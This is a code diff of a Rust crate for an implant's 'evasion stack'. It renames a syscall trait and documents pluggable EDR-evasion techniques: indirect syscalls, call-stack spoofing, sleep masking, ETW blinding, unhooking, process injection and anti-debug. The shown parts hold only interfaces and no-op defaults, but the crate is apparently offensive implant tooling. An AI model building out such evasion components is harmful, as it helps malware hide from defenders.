@@ -19,7 +19,7 @@
 //! ## The two-tier model
 //! ```text
 //!   EvasionStack  (this crate — runs INSIDE the PIC implant, no_std)
-//!   ├─ SyscallSource      indirect syscalls / SSN  (foundation; see nyx_evasion)
+//!   ├─ SyscallProvider    indirect syscalls / SSN  (foundation; see nyx_evasion)
 //!   ├─ PdataGapScanner    .pdata gap/ghost enum    (foundation for spoof + sleepmask)
 //!   ├─ StackSpoofKit      BYOUD-Gap / LACUNA       (per sensitive call)
 //!   ├─ SleepmaskKit       Ekko / Foliage / InsomniacUnwinding (mask→sleep→unmask)
@@ -44,7 +44,7 @@
 //! Seam surface is canonical and exhaustive; 5 of the 9 traits have LIVE
 //! impls in `implant-win/src/evasion_glue.rs` (`PdataGapScanner`, `StackSpoofKit`,
 //! `BlindKit`, `MemoryMaskKit`, `ProcessInjectKit` — the rest of this crate's
-//! floors remain the no-op default for the other four: `SyscallSource`,
+//! floors remain the no-op default for the other four: `SyscallProvider`,
 //! `SleepmaskKit`, `UnhookKit`, `AntiDebugKit`). Research-grounded technique
 //! lists per trait come from `docs/p2-2026-h2-latest-sweep.md`,
 //! `docs/p2-2026-kernel-tier-deepdive.md`, and the root research corpus.
@@ -130,13 +130,22 @@ impl KernelPosture {
 // ---- Foundation: syscall source -------------------------------------------
 
 /// SSN resolution + the indirect-syscall execution primitive. This is the
-/// foundation every sensitive call routes through. The concrete trait already
-/// lives in the `nyx_evasion` crate (`SyscallSource`); this alias is the seam
-/// contract for the stack so `EvasionStack` is self-contained.
+/// foundation every sensitive call routes through: `prime` resolves (or
+/// confirms) the syscall-number table for the live ntdll once, idempotently,
+/// before any sensitive call.
+///
+/// **Deliberately NOT an alias of `nyx_evasion::syscalls::SyscallSource`.**
+/// That trait is the byte-level input abstraction for the SSN-resolution
+/// ALGORITHMS (`read`/`exports` feeding Hell's/Halo's/Tartarus' Gate) and
+/// lives in the `nyx_evasion` crate. This seam is the higher-level "prime the
+/// runtime syscall table" contract for `EvasionStack`; a real impl uses the
+/// `nyx_evasion` algorithms internally, but the two traits have disjoint
+/// method sets and cannot be re-exported one for the other. The name
+/// `SyscallProvider` (not `SyscallSource`) keeps that distinction visible.
 ///
 /// Planned impls: `HellsGate`/`HalosGate`/`TartarusGate` (shipped) →
 /// `RecycledGate`, `SysWhispers4`, `Acheron`, `Sysplant`, `FreshyCalls`.
-pub trait SyscallSource {
+pub trait SyscallProvider {
     /// Resolve (or confirm) the syscall-number table for the live ntdll. Idempotent.
     fn prime(&self) -> Result<(), EvasionError>;
 }
@@ -203,7 +212,7 @@ impl Default for GapPool {
 // ---- Execution / memory obfuscation ---------------------------------------
 
 /// Call-stack spoof applied around every sensitive (syscall/API) call. Depends
-/// on `PdataGapScanner` + `SyscallSource`. CET-safe variants only — anything
+/// on `PdataGapScanner` + `SyscallProvider`. CET-safe variants only — anything
 /// mutating RSP-stack return addresses faults under CET.
 ///
 /// Planned impls: `NoSpoof` (floor), `ByoudGap`/`LacunaChain` (zero-.pdata-write,
@@ -394,9 +403,9 @@ pub trait AntiDebugKit {
 /// still assembles and behaves byte-identically to the un-evaded baseline.
 pub struct Floors;
 
-impl SyscallSource for Floors {
+impl SyscallProvider for Floors {
     fn prime(&self) -> Result<(), EvasionError> {
-        Err(EvasionError::NoFloor("SyscallSource"))
+        Err(EvasionError::NoFloor("SyscallProvider"))
     }
 }
 impl PdataGapScanner for Floors {
@@ -462,7 +471,7 @@ impl AntiDebugKit for Floors {
 /// kernel tier posture so impls can downgrade (e.g. skip BlindKit if ETW-TI is
 /// already blinded kernel-side).
 pub struct EvasionStack {
-    pub syscall: Box<dyn SyscallSource>,
+    pub syscall: Box<dyn SyscallProvider>,
     pub gaps: Box<dyn PdataGapScanner>,
     pub stack_spoof: Box<dyn StackSpoofKit>,
     pub sleepmask: Box<dyn SleepmaskKit>,
